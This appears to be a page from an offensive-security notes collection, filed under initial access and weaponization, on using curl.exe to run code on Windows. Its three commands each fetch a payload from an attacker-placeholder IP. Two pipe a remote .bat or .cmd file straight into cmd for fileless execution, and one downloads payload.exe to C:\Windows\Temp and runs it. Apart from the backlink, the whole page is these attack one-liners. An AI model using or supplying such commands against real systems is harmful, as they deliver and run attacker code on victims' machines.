# cURL

## 01 - Fileless Code Execution

```
C:\> curl.exe http[s]://<IP>/payload.bat | cmd

C:\> curl.exe http[s]://<IP>/payload.cmd | cmd
```

## 02 - Dropping On Disk

Download payload and execute it.

```
C:\> curl.exe -o C:\Windows\Temp\payload.exe http[s]://<IP>/payload.exe & C:\Windows\Temp\payload.exe
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/Batch]]